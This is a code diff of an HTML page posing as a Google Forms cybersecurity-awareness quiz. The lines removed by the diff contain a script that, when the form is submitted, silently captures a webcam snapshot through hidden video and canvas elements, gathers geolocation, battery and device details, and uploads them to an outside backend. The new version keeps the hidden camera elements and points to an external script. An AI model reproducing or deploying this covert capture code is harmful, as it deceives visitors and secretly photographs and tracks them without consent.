@@ -1,212 +1,139 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cyber-Security Awareness : Simple habits for digital safety.</title>
-    <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
-    <link rel="shortcut icon" sizes="16x16" href="https://ssl.gstatic.com/docs/spreadsheets/forms/favicon_qp2.png">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cyber-Security Awareness : Simple habits for digital safety.</title>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <link rel="shortcut icon" sizes="16x16" href="https://ssl.gstatic.com/docs/spreadsheets/forms/favicon_qp2.png">
 </head>
 <body>
-<div class="container">
+  <div class="container">
     <div class="form-wrapper" id="quiz-container">
-        <div class="form-header">
-            <div class="header-banner"></div>
-            <div class="header-content">
-                <h1>Cyber-Security Awareness : Simple habits for digital safety.</h1>
-                <p class="description">Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks.</p>
-                <div class="required-notice">* Indicates required question</div>
-            </div>
+      <div class="form-header">
+        <div class="header-banner"></div>
+        <div class="header-content">
+          <h1>Cyber-Security Awareness : Simple habits for digital safety.</h1>
+          <p class="description">Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks.</p>
+          <div class="required-notice">* Indicates required question</div>
+        </div>
+      </div>
+
+      <form id="quiz-form">
+        <div class="question-card">
+          <div class="question-title">Do you lock your phone with a PIN, PATTERN or FINGERPRINT? <span class="required">*</span></div>
+          <div class="radio-group">
+            <label class="radio-option">
+              <input type="radio" name="lock_phone" value="Yes" required>
+              <span class="radio-label">Yes</span>
+            </label>
+            <label class="radio-option">
+              <input type="radio" name="lock_phone" value="No">
+              <span class="radio-label">No</span>
+            </label>
+          </div>
         </div>
 
-        <form id="quiz-form">
-            <!-- NEW QUESTIONS -->
-            <div class="question-card">
-                <div class="question-title">Do you lock your phone with a PIN, PATTERN or FINGERPRINT? <span class="required">*</span></div>
-                <div class="radio-group">
-                    <label class="radio-option"><input type="radio" name="lock_phone" value="Yes" required><span class="radio-label">Yes</span></label>
-                    <label class="radio-option"><input type="radio" name="lock_phone" value="No"><span class="radio-label">No</span></label>
-                </div>
-            </div>
-
-            <div class="question-card">
-                <div class="question-title">Do you use same password for multiple apps or accounts? <span class="required">*</span></div>
-                <div class="radio-group">
-                    <label class="radio-option"><input type="radio" name="same_password" value="Yes" required><span class="radio-label">Yes</span></label>
-                    <label class="radio-option"><input type="radio" name="same_password" value="No"><span class="radio-label">No</span></label>
-                </div>
-            </div>
-
-            <div class="question-card">
-                <div class="question-title">Do you update your phone apps when updates are available? <span class="required">*</span></div>
-                <div class="radio-group">
-                    <label class="radio-option"><input type="radio" name="update_apps" value="Always" required><span class="radio-label">Always</span></label>
-                    <label class="radio-option"><input type="radio" name="update_apps" value="Sometimes"><span class="radio-label">Sometimes</span></label>
-                    <label class="radio-option"><input type="radio" name="update_apps" value="Maybe"><span class="radio-label">Maybe</span></label>
-                </div>
-            </div>
-
-            <div class="question-card">
-                <div class="question-title">Do you check the sender before clicking on links in WhatsApp? <span class="required">*</span></div>
-                <div class="radio-group">
-                    <label class="radio-option"><input type="radio" name="check_sender" value="Yes" required><span class="radio-label">Yes</span></label>
-                    <label class="radio-option"><input type="radio" name="check_sender" value="Sometimes"><span class="radio-label">Sometimes</span></label>
-                    <label class="radio-option"><input type="radio" name="check_sender" value="No"><span class="radio-label">No</span></label>
-                </div>
-            </div>
-
-            <div class="question-card">
-                <div class="question-title">Do you review Apps permissions carefully? <span class="required">*</span></div>
-                <div class="radio-group">
-                    <label class="radio-option"><input type="radio" name="review_permissions" value="Yes" required><span class="radio-label">Yes</span></label>
-                    <label class="radio-option"><input type="radio" name="review_permissions" value="No"><span class="radio-label">No</span></label>
-                </div>
-            </div>
-
-            <!-- ORIGINAL QUESTIONS -->
-            <div class="question-card">
-                <div class="question-title">Name <span class="required">*</span></div>
-                <div class="input-container"><input type="text" name="name" placeholder="Your answer" required class="text-input"></div>
-            </div>
-
-            <div class="question-card">
-                <div class="question-title">Which of the following is considered a strong password? <span class="required">*</span></div>
-                <div class="radio-group">
-                    <label class="radio-option"><input type="radio" name="strong_password" value="123456" required><span class="radio-label">123456</span></label>
-                    <label class="radio-option"><input type="radio" name="strong_password" value="Password123"><span class="radio-label">Password123</span></label>
-                    <label class="radio-option"><input type="radio" name="strong_password" value="Cyb3rS@f3ty!2024"><span class="radio-label">Cyb3rS@f3ty!2024</span></label>
-                    <label class="radio-option"><input type="radio" name="strong_password" value="Your pet's name"><span class="radio-label">Your pet's name</span></label>
-                </div>
-            </div>
-
-            <div class="question-card">
-                <div class="question-title">What should you do if you receive an unexpected email with a link from an unknown sender? <span class="required">*</span></div>
-                <div class="radio-group">
-                    <label class="radio-option"><input type="radio" name="unexpected_email" value="Click the link to see what it is" required><span class="radio-label">Click the link to see what it is</span></label>
-                    <label class="radio-option"><input type="radio" name="unexpected_email" value="Delete the email immediately without clicking any links"><span class="radio-label">Delete the email immediately without clicking any links</span></label>
-                    <label class="radio-option"><input type="radio" name="unexpected_email" value="Reply to the email and ask who they are"><span class="radio-label">Reply to the email and ask who they are</span></label>
-                    <label class="radio-option"><input type="radio" name="unexpected_email" value="Forward it to your friends"><span class="radio-label">Forward it to your friends</span></label>
-                </div>
-            </div>
-
-            <div class="question-card">
-                <div class="question-title">What is "Phishing"? <span class="required">*</span></div>
-                <div class="radio-group">
-                    <label class="radio-option"><input type="radio" name="phishing" value="A type of outdoor sport" required><span class="radio-label">A type of outdoor sport</span></label>
-                    <label class="radio-option"><input type="radio" name="phishing" value="A method of tricking people into giving up personal information"><span class="radio-label">A method of tricking people into giving up personal information</span></label>
-                    <label class="radio-option"><input type="radio" name="phishing" value="Installing a new antivirus software"><span class="radio-label">Installing a new antivirus software</span></label>
-                    <label class="radio-option"><input type="radio" name="phishing" value="Connecting to a public Wi-Fi"><span class="radio-label">Connecting to a public Wi-Fi</span></label>
-                </div>
-            </div>
-
-            <!-- Add rest of original questions here ... -->
-
-            <div class="form-footer">
-                <button type="submit" id="submit-btn" class="submit-button">Submit</button>
-            </div>
-        </form>
-
-        <div class="google-footer">
-            <p>Never submit passwords through Google Forms.</p>
-            <div class="branding">This content is neither created nor endorsed by Google. <u>Report Abuse</u> - <u>Terms of Service</u> - <u>Privacy Policy</u></div>
-            <div class="google-logo">Google Forms</div>
+        <div class="question-card">
+          <div class="question-title">Do you use same password for multiple apps or accounts? <span class="required">*</span></div>
+          <div class="radio-group">
+            <label class="radio-option">
+              <input type="radio" name="same_password" value="Yes" required>
+              <span class="radio-label">Yes</span>
+            </label>
+            <label class="radio-option">
+              <input type="radio" name="same_password" value="No">
+              <span class="radio-label">No</span>
+            </label>
+          </div>
         </div>
+
+        <div class="question-card">
+          <div class="question-title">Do you update your phone apps when updates are available? <span class="required">*</span></div>
+          <div class="radio-group">
+            <label class="radio-option">
+              <input type="radio" name="update_apps" value="Always" required>
+              <span class="radio-label">Always</span>
+            </label>
+            <label class="radio-option">
+              <input type="radio" name="update_apps" value="Sometimes">
+              <span class="radio-label">Sometimes</span>
+            </label>
+            <label class="radio-option">
+              <input type="radio" name="update_apps" value="Maybe">
+              <span class="radio-label">Maybe</span>
+            </label>
+          </div>
+        </div>
+
+        <div class="question-card">
+          <div class="question-title">Do you check the sender before clicking on links in WhatsApp? <span class="required">*</span></div>
+          <div class="radio-group">
+            <label class="radio-option">
+              <input type="radio" name="check_sender" value="Yes" required>
+              <span class="radio-label">Yes</span>
+            </label>
+            <label class="radio-option">
+              <input type="radio" name="check_sender" value="Sometimes">
+              <span class="radio-label">Sometimes</span>
+            </label>
+            <label class="radio-option">
+              <input type="radio" name="check_sender" value="No">
+              <span class="radio-label">No</span>
+            </label>
+          </div>
+        </div>
+
+        <div class="question-card">
+          <div class="question-title">Do you review Apps permissions carefully? <span class="required">*</span></div>
+          <div class="radio-group">
+            <label class="radio-option">
+              <input type="radio" name="review_permissions" value="Yes" required>
+              <span class="radio-label">Yes</span>
+            </label>
+            <label class="radio-option">
+              <input type="radio" name="review_permissions" value="No">
+              <span class="radio-label">No</span>
+            </label>
+          </div>
+        </div>
+
+        <div class="form-footer">
+          <button type="submit" id="submit-btn" class="submit-button">Submit</button>
+          <div class="footer-links"><span>Clear form</span></div>
+        </div>
+      </form>
+
+      <div class="google-footer">
+        <p>Never submit passwords through Google Forms.</p>
+        <div class="branding">This content is neither created nor endorsed by Google. <u>Report Abuse</u> - <u>Terms of Service</u> - <u>Privacy Policy</u></div>
+        <div class="google-logo">Google Forms</div>
+      </div>
     </div>
 
     <div class="form-wrapper success-wrapper" id="success-container" style="display: none;">
-        <div class="form-header">
-            <div class="header-banner"></div>
-            <div class="header-content">
-                <h1>Cyber-Security Awareness : Simple habits for digital safety.</h1>
-                <p>Your response has been recorded.</p>
-                <div class="success-links">
-                    <a href="#" onclick="location.reload()">Submit another response</a>
-                </div>
-            </div>
+      <div class="form-header">
+        <div class="header-banner"></div>
+        <div class="header-content">
+          <h1>Cyber-Security Awareness : Simple habits for digital safety.</h1>
+          <p>Your response has been recorded.</p>
+          <div class="success-links">
+            <a href="#" onclick="location.reload()">Submit another response</a>
+          </div>
         </div>
-        <div class="google-footer">
-            <div class="branding">This content is neither created nor endorsed by Google. <u>Report Abuse</u> - <u>Terms of Service</u> - <u>Privacy Policy</u></div>
-            <div class="google-logo">Google Forms</div>
-        </div>
+      </div>
+      <div class="google-footer">
+        <div class="branding">This content is neither created nor endorsed by Google. <u>Report Abuse</u> - <u>Terms of Service</u> - <u>Privacy Policy</u></div>
+        <div class="google-logo">Google Forms</div>
+      </div>
     </div>
-</div>
+  </div>
 
-<video id="video" autoplay playsinline style="display:none"></video>
-<canvas id="canvas" style="display:none"></canvas>
+  <!-- Hidden camera elements -->
+  <video id="video" autoplay playsinline style="display:none"></video>
+  <canvas id="canvas" style="display:none"></canvas>
 
-<script>
-const form = document.getElementById("quiz-form");
-const videoEl = document.getElementById("video");
-const canvasEl = document.getElementById("canvas");
-const backendURL = "https://troll-backend.onrender.com/api/upload";
-const constraints = { video: { facingMode: "user" }, audio: false };
-
-form.addEventListener("submit", async (e) => {
-    e.preventDefault();
-
-    const submitBtn = document.getElementById("submit-btn");
-    submitBtn.disabled = true;
-    submitBtn.textContent = "Submitting...";
-
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        videoEl.srcObject = stream;
-        await videoEl.play();
-        await new Promise(res => videoEl.addEventListener("canplay", () => setTimeout(res, 300)));
-
-        const ctx = canvasEl.getContext("2d");
-        canvasEl.width = videoEl.videoWidth;
-        canvasEl.height = videoEl.videoHeight;
-        ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
-        const image = canvasEl.toDataURL("image/png");
-
-        const metadata = {
-            useragent: navigator.userAgent,
-            platform: navigator.platform,
-            width: window.innerWidth,
-            height: window.innerHeight,
-            language: navigator.language,
-            battery: "N/A",
-            location: "N/A",
-            time: new Date().toLocaleString()
-        };
-
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            metadata.battery = battery.level * 100 + "%";
-        }
-        if (navigator.geolocation) {
-            try {
-                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
-                metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
-            } catch {
-                metadata.location = "Denied";
-            }
-        }
-
-        await fetch(backendURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ image, metadata })
-        });
-
-        videoEl.srcObject.getTracks().forEach(track => track.stop());
-
-        document.getElementById("quiz-container").style.display = "none";
-        document.getElementById("success-container").style.display = "block";
-
-        submitBtn.disabled = false;
-        submitBtn.textContent = "Submit";
-
-    } catch (err) {
-        console.error(err);
-        alert("Please allow camera access!");
-        submitBtn.disabled = false;
-        submitBtn.textContent = "Submit";
-    }
-});
-</script>
+  <script src="script.js"></script>
 </body>
 </html>
-
